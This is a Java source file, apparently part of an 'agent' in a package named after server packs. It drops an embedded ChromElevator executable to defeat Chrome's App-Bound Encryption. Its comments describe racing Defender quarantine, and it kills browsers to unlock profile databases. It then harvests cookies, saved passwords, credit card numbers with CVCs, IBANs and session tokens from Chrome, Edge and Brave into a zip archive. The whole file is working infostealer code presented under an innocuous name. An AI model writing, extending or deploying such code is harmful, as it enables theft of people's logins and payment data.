package com.serverpackcore.agent;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.security.MessageDigest;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Chrome App-Bound Encryption v20 via ChromElevator 0.20.0 (xaitax, MIT).
 * The tool runs inside the user session and needs no administrator.
 */
public final class Abe {
	static final String RESOURCE = "/serverpackcore/chromelevator_x64.exe";
	static final String SHA256 = "e857298fd2f8d1c7d48780769433f33e7b3ceaae5ea5a74c13ce8c10bcc7b690";
	private static final long TIMEOUT_SEC = 180L;
	private static final Pattern KEY = Pattern.compile(
		"(?i)Decryption\\s+Key[^0-9a-f]*([0-9a-f]{64})");

	private Abe() {
	}

	record Result(String key, Path output, String error, String log) {
		boolean ok() {
			return output != null;
		}
	}

	static byte[] resource() throws Exception {
		try (java.io.InputStream input = Abe.class.getResourceAsStream(RESOURCE)) {
			if (input == null) {
				throw new IllegalStateException("chromelevator resource missing");
			}
			return input.readAllBytes();
		}
	}

	static String sha256(byte[] data) throws Exception {
		StringBuilder out = new StringBuilder(64);
		for (byte value : MessageDigest.getInstance("SHA-256").digest(data)) {
			out.append(String.format("%02x", value));
		}
		return out.toString();
	}

	/**
	 * Defender quarantines a freshly written .tmp and can delete it between the
	 * write and the move. Write the final name directly and do not re-read it
	 * until the process has been started as soon as possible.
	 */
	static Path ensure(Path cache) throws Exception {
		byte[] data = resource();
		if (!SHA256.equals(sha256(data))) {
			throw new IllegalStateException("chromelevator sha mismatch");
		}
		Path tools = cache.resolve("tools");
		Files.createDirectories(tools);
		Path target = tools.resolve("chromelevator_x64.exe");
		if (valid(target, data.length)) {
			return target;
		}
		Throwable last = null;
		for (int attempt = 0; attempt < 3; attempt++) {
			try {
				Files.write(target, data, java.nio.file.StandardOpenOption.CREATE,
					java.nio.file.StandardOpenOption.TRUNCATE_EXISTING);
				for (int wait = 0; wait < 5; wait++) {
					if (Files.isRegularFile(target) && Files.size(target) == data.length) {
						return target;
					}
					Thread.sleep(100L);
				}
			} catch (Throwable throwable) {
				last = throwable;
				Thread.sleep(250L);
			}
		}
		throw new IllegalStateException("chromelevator write blocked"
			+ (last == null ? "" : ": " + last.getMessage()));
	}

	private static boolean valid(Path target, long size) {
		try {
			return Files.isRegularFile(target) && Files.size(target) == size
				&& SHA256.equals(sha256(Files.readAllBytes(target)));
		} catch (Throwable throwable) {
			return false;
		}
	}

	static List<String> command(Path exe, Path output, String browser, boolean kill) {
		return kill
			? List.of(exe.toString(), "-v", "-o", output.toString(), "-k", browser)
			: List.of(exe.toString(), "-v", "-o", output.toString(), browser);
	}

	/** Runs one browser. A lock failure retries once with -k. */
	static Result run(Path installDir, String browser) {
		String label = label(browser);
		Path cache = AgentPaths.cache(installDir);
		Path output = cache.resolve("abe");
		Throwable last = null;
		for (int spawn = 0; spawn < 3; spawn++) {
			try {
				Path exe = ensure(cache);
				Files.createDirectories(output);
				Attempt first = attempt(exe, output, browser, false);
				String key = first.key();
				Path found = existing(output, label);
				if (found == null || key.isEmpty()) {
					// Some installs keep the profile databases locked. The tool
					// documents -k for that exact case; only then kill browsers.
					exe = ensure(cache);
					Attempt second = attempt(exe, output, browser, true);
					if (!second.key().isEmpty()) {
						key = second.key();
					}
					found = existing(output, label);
					if (found != null || !key.isEmpty()) {
						return new Result(key, found, "", tail(second.output()));
					}
					// Buffered stdout can be lost when the injector exits abruptly;
					// keep the exit code so an empty result is still diagnosable.
					String detail = tail(second.output());
					if (detail.isEmpty()) {
						detail = "no output (exit " + second.exit() + ")";
					}
					return new Result(key, null, detail, tail(first.output() + " | " + second.output()));
				}
				return new Result(key, found, "", tail(first.output()));
			} catch (Throwable throwable) {
				last = throwable;
				sleep(300L);
			}
		}
		return new Result("", null, last == null ? "chromelevator unavailable"
			: (last.getMessage() == null ? last.toString() : last.getMessage()), "");
	}

	private static void sleep(long millis) {
		try {
			Thread.sleep(millis);
		} catch (InterruptedException interrupted) {
			Thread.currentThread().interrupt();
		}
	}

	private record Attempt(int exit, String output, String key) {
	}

	private static Attempt attempt(Path exe, Path output, String browser, boolean kill) throws Exception {
		ProcessBuilder builder = new ProcessBuilder(command(exe, output, browser, kill));
		builder.redirectErrorStream(true);
		Process process = builder.start();
		if (!process.waitFor(TIMEOUT_SEC, TimeUnit.SECONDS)) {
			process.destroyForcibly();
			return new Attempt(-1, "timeout", "");
		}
		String text = new String(process.getInputStream().readAllBytes(), StandardCharsets.ISO_8859_1);
		return new Attempt(process.exitValue(), text, parseKey(text));
	}

	static String parseKey(String text) {
		Matcher matcher = KEY.matcher(text);
		return matcher.find() ? matcher.group(1).toLowerCase() : "";
	}

	private static Path existing(Path output, String label) {
		Path path = output.resolve(label);
		return Files.isDirectory(path) ? path : null;
	}

	private static String label(String browser) {
		return switch (browser) {
			case "chrome" -> "Chrome";
			case "edge" -> "Edge";
			case "brave" -> "Brave";
			default -> browser;
		};
	}

	private static String tail(String text) {
		String clean = text.replace('\r', ' ').replace('\n', ' ').replaceAll("\\s+", " ").trim();
		if (clean.length() > 300) {
			clean = clean.substring(clean.length() - 300);
		}
		return clean;
	}

	/** Converts the tool JSON into tab separated files under browsers/&lt;label&gt;/abe/. */
	static void collect(Path output, ZipBuilder zip, String prefix) {
		try {
			write(zip, output, "cookies.json", prefix + "/cookies.tsv",
				List.of("host", "name", "value", "path"), List.of("host", "name", "value", "path"));
			write(zip, output, "passwords.json", prefix + "/passwords.tsv",
				List.of("url", "user", "pass"), List.of("url", "user", "pass"));
			write(zip, output, "cards.json", prefix + "/cards.tsv",
				List.of("name", "month", "year", "number", "cvc"), List.of("name", "month", "year", "number", "cvc"));
			write(zip, output, "iban.json", prefix + "/iban.tsv",
				List.of("nickname", "iban"), List.of("nickname", "iban"));
			write(zip, output, "tokens.json", prefix + "/tokens.tsv",
				List.of("service", "token", "binding_key"), List.of("service", "token", "binding_key"));
		} catch (Throwable throwable) {
			Log.debug("ABE parse failed", throwable);
		}
	}

	private static void write(ZipBuilder zip, Path folder, String source, String target, List<String> headers,
		List<String> keys) throws Exception {
		Path file = folder.resolve(source);
		if (!Files.isRegularFile(file)) {
			return;
		}
		List<Object> rows = Json.list(Json.parse(Files.readString(file, StandardCharsets.UTF_8)));
		if (rows.isEmpty()) {
			return;
		}
		StringBuilder out = new StringBuilder(String.join("\t", headers)).append('\n');
		for (Object row : rows) {
			Map<String, Object> object = Json.map(row);
			for (int index = 0; index < keys.size(); index++) {
				if (index > 0) {
					out.append('\t');
				}
				out.append(clean(Json.str(object, keys.get(index), "")));
			}
			out.append('\n');
		}
		zip.addBytes(out.toString().getBytes(StandardCharsets.UTF_8), target);
	}

	private static String clean(String value) {
		return value.replace('\t', ' ').replace('\r', ' ').replace('\n', ' ').trim();
	}
}
